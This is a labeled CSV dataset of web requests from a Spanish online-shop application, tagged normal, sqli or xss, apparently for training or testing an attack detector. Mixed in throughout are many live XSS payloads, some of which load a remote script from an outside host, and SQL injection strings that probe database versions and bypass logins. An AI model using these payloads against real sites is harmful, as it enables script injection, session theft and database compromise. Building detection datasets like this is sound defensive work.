payload,type
imagenes/logo.gif,normal
4.09E+15,normal
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=71&B1=A%F1adir+al+carrito,normal
publico/autenticar.jsp?modo=entrar&login=vispy&pwd=2u17z0o&remember=off&B1=Entrar,normal
96to3a38,normal
imagenes/nuestratierra.jpg,normal
imagenes/nuestratierra.jpg,normal
imagenes/2.gif,normal
miembros/index.jsp,normal
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,sqli
"<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"s?os: select * from users where id=1 or ""?%"" or 1=1 -- 1",sqli
cos6rio,normal
"<A HREF=""http://66.102.7.147/"">XSS</A>",xss
global/menum.jsp,normal
26141,normal
imagenes/1.gif,normal
tacoronte,normal
publico/carrito.jsp,normal
' or 1 --',sqli
n.&1c: select * from users where id=1 +$ . or 1=1 -- 1,sqli
imagenes/cmenbul.gif,normal
cabarrs zafn,normal
miembros/imagenes/zarauz.jpg,normal
membrilla,normal
"<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>",xss
publico/caracteristicas.jsp?id=2,normal
publico/caracteristicas.jsp?id=2,normal
index.jsp,normal
publico/autenticar.jsp?modo=entrar&login=chunyen&pwd=inconSTItUcIONaL&remember=on&B1=Entrar,normal
5498,normal
<body/onload=&lt;!--&gt;&#10alert(1)>,xss
global/creditos.jsp,normal
ferreruela,normal
&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;,xss
"<IMG SRC=x onbeforeunload=""alert(String.fromCharCode(88,83,83))"">",xss
imagenes/nuestratierra.jpg,normal
eccles@aspirantes.gh,normal
"n1UEv: select * from users where id=1 +$ 1 union select null,@@VERSION -- 1",sqli
publico/registro.jsp?modo=registro&login=thieu&password=pillo&nombre=Macrina&apellidos=Furnari+Pentinat&email=brinton2%40tartasconamor.lr&dni=57476315M&direccion=Juan+De+Mariana%2C+150%2C+&ciudad=Coca+de+Alba&cp=03390&provincia=Madrid&ntc=3742884361976074&B1=Registrar,normal
imagenes/2.gif,normal
publico/carrito.jsp,normal
global/menum.jsp,normal
47eg0,normal
imagenes/nuestratierra.jpg,normal
"s.)s: select * from users where id=1 or "".)"" or 1=1 -- 1",sqli
koock@aridossanchez.mt,normal
goble,normal
"`""'><img src=xxx:x \x0Bonerror=javascript:alert(1)>",xss
zahn,normal
imagenes/cmenbul.gif,normal
aguilar de cods,normal
"<a href=""\x00javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/registro.jsp?modo=registro&login=opaline&password=sagard%FAa&nombre=Vazk%E9n&apellidos=Chumbiauca&email=standiford%40elpaisaje.bg&dni=17115248M&direccion=Plza.+Santa+Marina%2C+S%2FN%2C+12%3FH&ciudad=Casabermeja&cp=03520&provincia=Lleida&ntc=1289184005344933&B1=Registrar,normal
global/titulo.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
parke konstituzio 128 2?b,normal
vazkn,normal
villanueva gualano,normal
24120558k,normal
t1iesti70,normal
revill5,normal
"<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
hennon,normal
37711,normal
0e06u8s17,normal
publico/carrito.jsp,normal
"<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
global/menum.jsp,normal
miembros/imagenes/zarauz.jpg,normal
miembros/fotos.jsp,normal
7964,normal
publico/productos.jsp,normal
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=49&B1=A%F1adir+al+carrito,normal
fulmer,normal
publico/caracteristicas.jsp?id=2,normal
"calle maria marin, 196,",normal
pau gargallo 120 8-b,normal
global/titulo.jsp,normal
miembros/editar.jsp?modo=registro&login=ichizen&password=Ca%D1iLLa&nombre=Rafaela&apellidos=Lemunao+Porxas&email=callaway.nererova%40mirallesmoscardo.ca&dni=55658066K&direccion=C%2F+Madre+Castisima%2C+S%2FN+&ciudad=Lupiana&cp=09267&provincia=Alicante&ntc=6588349336548778&B1=Registrar,normal
publico/autenticar.jsp?modo=entrar&login=ronaldso&pwd=enjoyelada&remember=on&B1=Entrar,normal
miembros/imagenes/castro.jpg,normal
imagenes/logo.gif,normal
miembros/imagenes/castro.jpg,normal
39672063f,normal
""";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert("";XSS"";)>;",xss
publico/carrito.jsp,normal
caldes,normal
5.80E+15,normal
publico/miembros.jsp,normal
global/estilos.css,normal
publico/carrito.jsp,normal
miembros/imagenes/castro.jpg,normal
publico/registro.jsp?modo=registro&login=eward&password=%24despumar&nombre=Rory&apellidos=Naredo+Reggiardo&email=korey_molina%40juguetespersonales.gob&dni=37068097D&direccion=Calle+Fausto+Fraile+0+&ciudad=Aracena&cp=17256&provincia=Palencia&ntc=3362439041972349&B1=Registrar,normal
miembros/imagenes/castro.jpg,normal
miembros/salir.jsp,normal
&lt;? echo('&lt;SCR)';,xss
"<div style=""background-image: url(javascript:document.vulnerable=true;);"">",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
foulk@eonon.com.es,normal
cimorro,normal
global/estilos.css,normal
48c09a,normal
miembros/imagenes/castro.jpg,normal
teruyuki,normal
imagenes/3.gif,normal
"' union select * from users where login = char(114,111,111,116);",sqli
global/menum.jsp,normal
miembros/imagenes/zarauz.jpg,normal
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",xss
zanobia,normal
olmos de esgueva,normal
¼script¾alert(¢XSS¢)¼/script¾,xss
"o1UEv: select * from users where id=1 *1 union select null,banner from v$version where rownum=1 -- 1",sqli
1.89E+15,normal
"sn)s: select * from users where id=1 or ""_)"" or 1=1 -- 1",sqli
"<video><source onerror=""javascript:javascript:alert(1)"">",xss
miembros/fotos.jsp,normal
2.82E+15,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<? foo=""><script>javascript:alert(1)</script>"">",xss
arvizu tirapu,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=33&B1=A%F1adir+al+carrito,normal
"<body onload=""document.vulnerable=true;"">",xss
"<IMG SRC=x oncanplaythrough=""alert(String.fromCharCode(88,83,83))"">",xss
imagenes/1.gif,normal
falset,normal
global/estilos.css,normal
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,xss
18210,normal
miembros/index.jsp,normal
imagenes/cmenbul.gif,normal
miembros/index.jsp,normal
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",xss
9667,normal
imagenes/1.gif,normal
2293,normal
"<img """"""><script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",xss
miembros/index.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"ABC<div style=""x:\x00expression(javascript:alert(1)"">DEF",xss
"s1UEf: select * from users where id=1 or 1#""1 union select version(),version() -- 1",sqli
1193,normal
global/creditos.jsp,normal
imagenes/2.gif,normal
montroy,normal
"<a href=""\xE2\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
6.71E+14,normal
miembros/imagenes/ogono.jpg,normal
8449,normal
46724,normal
joudrey,normal
garroch_ista,normal
publico/caracteristicas.jsp?id=2,normal
"""><img src=x onerror=javascript:alert((`1`))>",xss
pfeilsch,normal
"<img src=# onerror\x3D""javascript:alert(1)"" >",xss
"admin"" or 1=1#",sqli
&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;,xss
' or 1=1 or ''=',sqli
miembros/editar.jsp?modo=registro&login=pacon&password=protoalb%E9itar&nombre=Fabiela&apellidos=Maurici+Garrudo&email=wilde%40casasdefamosos.zw&dni=25793872Q&direccion=C%2F+Arquitecto+Ricardo+Velazquez+Bosco%2C+127%2C+3G&ciudad=Ademuz&cp=27654&provincia=Asturias&ntc=2657051536857190&B1=Registrar,normal
2925,normal
"' union (select NULL, (select @@version)) --",sqli
estolano boget,normal
imagenes/nuestratierra.jpg,normal
bernab,normal
miembros/editar.jsp?modo=registro&login=yaeger&password=c%21andeleta&nombre=Claudio&apellidos=Cazallas+Caminal&email=reaves-phillips%40baybay.tm&dni=58783501D&direccion=Avinguda+De+La+Reina+Maria+Cristina+174+2%3FB&ciudad=Mesas%2C+Las&cp=44220&provincia=Badajoz&ntc=2524414881203627&B1=Registrar,normal
miembros/imagenes/castro.jpg,normal
detleff3,normal
publico/autenticar.jsp?modo=entrar&login=odden&pwd=8030e&remember=on&B1=Entrar,normal
global/estilos.css,normal
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",xss
"<;SCRIPT a="";>;""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
miembros/fotos.jsp,normal
10550,normal
imagenes/logo.gif,normal
"<body onLoad=""while(true) alert('XSS');"">",xss
.11ne5o,normal
publico/productos.jsp,normal
pacn,normal
mahl iglesia,normal
45370,normal
porta catorce 60 6?f,normal
publico/caracteristicas.jsp?id=2,normal
publico/caracteristicas.jsp?id=1,normal
miembros/imagenes/castro.jpg,normal
miembros/salir.jsp,normal
publico/pagar.jsp?modo=insertar&precio=7106&B1=Confirmar,normal
"sovvU: select * from users where id='1' + @ @1 union select 1,version() -- 1'",sqli
imagenes/nuestratierra.jpg,normal
"<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>",xss
shou-che,normal
global/estilos.css,normal
"<;STYLE type="";text/css"";>;BODY{background:url("";javascript:alert(';XSS';)"";)}<;/STYLE>;",xss
publico/autenticar.jsp?modo=entrar&login=jayavant&pwd=2s323a657a679&remember=on&B1=Entrar,normal
"s?.s: select * from users where id=1 or ""]."" or 1=1 -- 1",sqli
imagenes/2.gif,normal
publico/autenticar.jsp?modo=entrar&login=rong&pwd=d6mnificar&remember=off&B1=Entrar,normal
"`""'><img src=xxx:x \x2Fonerror=javascript:alert(1)>",xss
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",xss
jesusa,normal
</title><SCRIPT>document.vulnerable=true;</script>,xss
imagenes/cmenbul.gif,normal
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss
"s.UEv: select * from users where id=1 or 1#"". union select null,version() -- 1",sqli
"<img src=1 href=1 onerror=""javascript:alert(1)""></img>",xss
"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
shan-min,normal
56597686e,normal
trese,normal
garek,normal
admin' or '1'='1'/*,sqli
<iframe/onreadystatechange=alert(1),xss
29%,sqli
imagenes/1.gif,normal
winde,normal
publico/pagar.jsp?modo=insertar&precio=1111&B1=Pasar+por+caja,normal
miembros/imagenes/ogono.jpg,normal
admin' or 1=1/*,sqli
publico/autenticar.jsp?modo=entrar&login=centeno&pwd=b%FAho&remember=off&B1=Entrar,normal
bilal,normal
global/creditos.jsp,normal
miembros/imagenes/ogono.jpg,normal
miembros/imagenes/ogono.jpg,normal
39515,normal
mcglynn,normal
julin,normal
global/creditos.jsp,normal
"<;IMG STYLE="";xss:expr/*XSS*/ession(alert(';XSS';))"";>;",xss
imagenes/2.gif,normal
miembros/index.jsp,normal
publico/autenticar.jsp?modo=entrar&login=ebony&pwd=manferidor&remember=off&B1=Entrar,normal
<script>%(payload)s</script>,xss
"""><img src=x onerror=javascript:alert(('A'))>",xss
x' AND 1=(SELECT COUNT(*) FROM tabname); --,sqli
fililberto,normal
48710,normal
torres de berrelln,normal
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera},xss
ejerci78,normal
publico/autenticar.jsp?modo=entrar&login=baziuk4&pwd=376g%E1stu90&remember=off&B1=Entrar,normal
bablica,normal
<marquee><script>alert('XSS')</script></marquee>,xss
imagenes/logo.gif,normal
"<IMG SRC=""livescript:[code]"">",xss
41953346n,normal
matungo,normal
publico/caracteristicas.jsp?id=1,normal
imagenes/2.gif,normal
ajmet,normal
"&ovUE: select * from users where id=1 or !<@ union select 1,version() -- 1",sqli
benabarre,normal
calle benifallim 97 10?e,normal
publico/caracteristicas.jsp?id=2,normal
index.jsp,normal
14602519a,normal
87853992h,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"plza. mariano arregui canela 171,",normal
global/titulo.jsp,normal
69557398q,normal
Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser,xss
valverde de alcal,normal
imagenes/logo.gif,normal
d060u2ar,normal
&lt;/BODY&gt;&lt;/HTML&gt;,xss
publico/autenticar.jsp?modo=entrar&login=shuster&pwd=suti8me9te&remember=off&B1=Entrar,normal
pr3caz,normal
"<IMG onmouseover=""alert('xxs')"">",xss
custom.js,normal
ductilidad,normal
imagenes/cmenbul.gif,normal
"<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
global/titulo.jsp,normal
global/titulo.jsp,normal
"<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow=""alert(1)"";",xss
"<img SRC=""javascript:document.vulnerable=true;""",xss
imagenes/nuestratierra.jpg,normal
miembros/editar.jsp?modo=registro&login=leyden&password=c96revEidil5&nombre=Delia&apellidos=Busoms+Redolad&email=eyre9%40ringringcargo.tn&dni=41022572W&direccion=Las+Palmeras+91+5B&ciudad=Oca%F1a&cp=29691&provincia=Murcia&ntc=9830070914840932&B1=Registrar,normal
"<img dynsrc=""javascript:document.vulnerable=true;"">",xss
17744,normal
miembros/imagenes/castro.jpg,normal
publico/registro.jsp?modo=registro&login=jean-yve&password=reTEjAdOR&nombre=Cancia&apellidos=O%27Kinghtons+Camarena&email=olrich-shapiro1%40nuriamartin.aw&dni=97060354D&direccion=Senda+Buen+Paso+S%2FN%2C+&ciudad=Luesia&cp=22390&provincia=Asturias&ntc=8267431025409914&B1=Registrar,normal
furet@sanchezquesada.lc,normal
rahmani,normal
verite@culturalsanpedrocf.dm,normal
17240,normal
langellotti,normal
imagenes/3.gif,normal
global/estilos.css,normal
global/menum.jsp,normal
"s?UEf: select * from users where id=1 or 1#""? union select version(),version() -- 1",sqli
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=49&B1=A%F1adir+al+carrito,normal
"tebete, s/n, 8?d",normal
publico/productos.jsp,normal
publico/caracteristicas.jsp?id=2,normal
publico/autenticar.jsp?modo=entrar&login=chungjen&pwd=.corporativo&remember=off&B1=Entrar,normal
"<img src\x10=x onerror=""javascript:alert(1)"">",xss
<script>%(payload)s</script>,xss
39202408n,normal
"<;A HREF="";http://ha.ckers.org@google"";>;XSS<;/A>;",xss
n2ga1,normal
fredes damas,normal
publico/registro.jsp?modo=registro&login=ntpadmin&password=capa0r980&nombre=Roni&apellidos=Aldunce+Garbino&email=buffet%40aou.com.tn&dni=26295439E&direccion=C%2F+Tamesis+39%2C+1%3FC&ciudad=Jana%2C+la&cp=07500&provincia=Segovia&ntc=9875693785507781&B1=Registrar,normal
miembros/imagenes/castro.jpg,normal
"<event-source src=""%(event)s"" onload=""javascript:alert(1)"">",xss
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=0&B1=A%F1adir+al+carrito,normal
"sn:s: select * from users where id=1 or ""$:"" or 1=1 -- 1",sqli
imagenes/nuestratierra.jpg,normal
regla casiano,normal
miembros/editar.jsp?modo=registro&login=mcarthur&password=g53ON3a9u56&nombre=Efra%EDn&apellidos=Virhuez+Prats&email=sripatimakul%40forohh.ic&dni=08968667R&direccion=Camino+El+Pino%2C+151%2C+5-B&ciudad=Argujillo&cp=39450&provincia=Badajoz&ntc=7202990502846857&B1=Registrar,normal
wittik,normal
sellees,normal
publico/miembros.jsp,normal
8.37E+15,normal
miembros/editar.jsp?modo=registro&login=wenzel&password=borrica&nombre=Mar%EDa+de+Aranz%FA&apellidos=Moretti+Alegre&email=terry%40mtos.ar&dni=56546514W&direccion=Rua+Bamio%2C+190+11%3FH&ciudad=Pelarrodr%EDguez&cp=43550&provincia=Lleida&ntc=0947549871262969&B1=Registrar,normal
10380,normal
pettinge,normal
2595,normal
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",xss
miembros/imagenes/zarauz.jpg,normal
imagenes/logo.gif,normal
"<img src=x\x11onerror=""javascript:alert(1)"">",xss
"peral, 180 4-b",normal
miremont@barnicesuv.th,normal
sunderla,normal
"cuerlas, las",normal
"""`'><script>\xC2\xA0javascript:alert(1)</script>",xss
miembros/salir.jsp,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=98&B1=A%F1adir+al+carrito,normal
"""`'><script>\xE2\x80\x81javascript:alert(1)</script>",xss
publico/registro.jsp?modo=registro&login=chungen&password=6r_o733300e&nombre=Argentino&apellidos=Gallart+Coc%F3m&email=edmunds.emil%40carimartin.io&dni=80483953F&direccion=Glorieta+Antonio+Molina+87%2C+&ciudad=Sari%F1ena&cp=42223&provincia=Guadalajara&ntc=6206191254660151&B1=Registrar,normal
publico/autenticar.jsp?modo=entrar&login=shing-mi&pwd=d9s1a1i89&remember=on&B1=Entrar,normal
"c/ violetas 43, 3-a",normal
kiam,normal
"&lt;IMG SRC=`javascript&#058;alert(\""RSnake says, 'XSS'\"")`&gt;",xss
niu,normal
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
or 1=1/*,sqli
lauraine,normal
<style onreadystatechange=javascript:javascript:alert(1);></style>,xss
encad7622i6,normal
"ruiz de alda, 78",normal
"sov1U: select * from users where id='1' + @ 1 union select 1,version() -- 1'",sqli
global/estilos.css,normal
ca5r7211a,normal
46177,normal
publico/caracteristicas.jsp?id=2,normal
pridiliano,normal
"""><img src=x onerror=javascript:alert('A')>",xss
publico/caracteristicas.jsp?id=1,normal
&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;,xss
"s:)s: select * from users where id=1 or "":)""=1 or 1=1 -- 1",sqli
publico/productos.jsp,normal
<script itworksinallbrowsers>/*<script* */alert(1)</script,xss
getulio,normal
publico/registro.jsp?modo=registro&login=arda&password=e4can7ilader0&nombre=Aristi%F3n&apellidos=Masvidal+Canino&email=pepe.whitehead%40jaxiaabogadosyeconomistas.nr&dni=45518730M&direccion=Alqueria+De+Coca+38%2C+&ciudad=Membr%EDo&cp=05140&provincia=Guadalajara&ntc=1729966765537707&B1=Registrar,normal
miembros/fotos.jsp,normal
valverde de valdelacasa,normal
9570,normal
roco daira,normal
"c/ 57 15, 9g",normal
miembros/salir.jsp,normal
greg,normal
"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
' UNION ALL SELECT,sqli
miembros/imagenes/castro.jpg,normal
publico/productos.jsp,normal
"1UEvk: select * from users where id=1 +1 union select null,banner from v$version where rownum=1 -- 1",sqli
imagenes/cmenbul.gif,normal
"<;SCRIPT>;document.write("";<;SCRI"";);<;/SCRIPT>;PT SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
<BODY ONLOAD=alert('XSS')>,xss
imagenes/logo.gif,normal
9903rti37,normal
89388462c,normal
pascuala,normal
#NAME?,normal
"<a href=""javascript\x00:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
miembros/editar.jsp?modo=registro&login=chao-pin2&password=rabassa&nombre=Graciliano&apellidos=Ishida+Lasalle&email=dresdel.holmer%40xavipetit.um&dni=81568460H&direccion=Calle+Poador%2C+65+3A&ciudad=Fregeneda%2C+La&cp=47150&provincia=Valencia&ntc=3748443978921311&B1=Registrar,normal
ferreries,normal
vislumbrar,normal
global/menum.jsp,normal
imagenes/3.gif,normal
miembros/editar.jsp?modo=registro&login=linden&password=organero&nombre=Alio&apellidos=Gallegos+Angeleri&email=shumsky.zalata5%40telelujo.ci&dni=41909752A&direccion=Alicante+119%2C+&ciudad=Benalm%E1dena&cp=25140&provincia=Ja%E9n&ntc=9201759661755850&B1=Registrar,normal
"UE1n: select * from users where id=1 union select 1`\`,version() -- 1",sqli
bonfiglio cabanas,normal
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
"marcelino suarez 39,",normal
bu7c2pi,normal
imagenes/nuestratierra.jpg,normal
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",xss
60781516z,normal
"""/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />",xss
"<;SCRIPT a="";>';>""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
2ovi4in,normal
publico/productos.jsp,normal
"sv;s: select * from users where id=1 or ""@;""=1 or 1=1 -- 1",sqli
global/creditos.jsp,normal
54368029p,normal
"<br SIZE=""&{document.vulnerable=true}"">",xss
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
publico/productos.jsp,normal
